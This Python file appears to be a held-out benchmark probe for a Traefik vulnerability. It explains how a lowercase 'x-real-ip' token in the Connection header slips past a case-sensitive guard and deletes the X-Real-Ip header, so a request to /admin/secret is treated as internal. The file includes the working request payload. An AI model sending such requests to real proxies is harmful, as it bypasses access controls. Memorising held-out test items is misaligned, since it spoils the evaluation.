#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-29054 residual — Traefik Connection-header case-sensitivity bypass.

The CVE-2024-45410 fix (V1 = 2.11.9) added removeConnectionHeaders, which protects Traefik-managed
forwarded headers from the hop-by-hop `Connection` strip. BUT the guard compares the Connection
token against the protected names CASE-SENSITIVELY (slices.Contains(xHeaders, sf), where xHeaders
holds canonical names like `X-Real-Ip`), while the subsequent deletion (req.Header.Del(sf)) and
Go's own header map operate CASE-INSENSITIVELY. So an attacker sends a LOWERCASE token:

    GET /admin/secret HTTP/1.1
    Connection: close, x-real-ip        <- lowercase slips past the case-sensitive guard

`x-real-ip` != `X-Real-Ip`, so it is NOT recognized as protected; the code falls through to
req.Header.Del("x-real-ip"), which canonicalizes the key and deletes the real X-Real-Ip header.
The backend receives NO X-Real-Ip -> trusted internal-origin -> ${PCB_FLAG} returned.

Contract: reaches the flag on V1 (same removeConnectionHeaders sink; canonical strip fixed but
lowercase still deletes). BLOCKED on V2 (2.11.38): the token is canonicalized first
(key := http.CanonicalHeaderKey(sf)) and slices.Contains(xHeaders, key) matches -> the header is
protected -> X-Real-Ip survives -> untrusted identity present -> "forbidden", no flag.
"""
from __future__ import annotations

REAL_PATH = "/admin/secret"
# Lowercase token: bypasses the v2.11.9 case-sensitive guard, still deletes X-Real-Ip.
CONNECTION = "close, x-real-ip"


def candidate() -> dict:
    """Request candidate: GET /admin/secret with a Connection header naming x-real-ip (lowercase)."""
    return {
        "probe_id": "cve-2026-29054-connection-lowercase-xrealip-strip",
        "method": "GET",
        "path": REAL_PATH,
        "headers": {"Connection": CONNECTION},
    }


if __name__ == "__main__":
    c = candidate()
    print(f"{c['method']} {c['path']}  headers={c['headers']}")
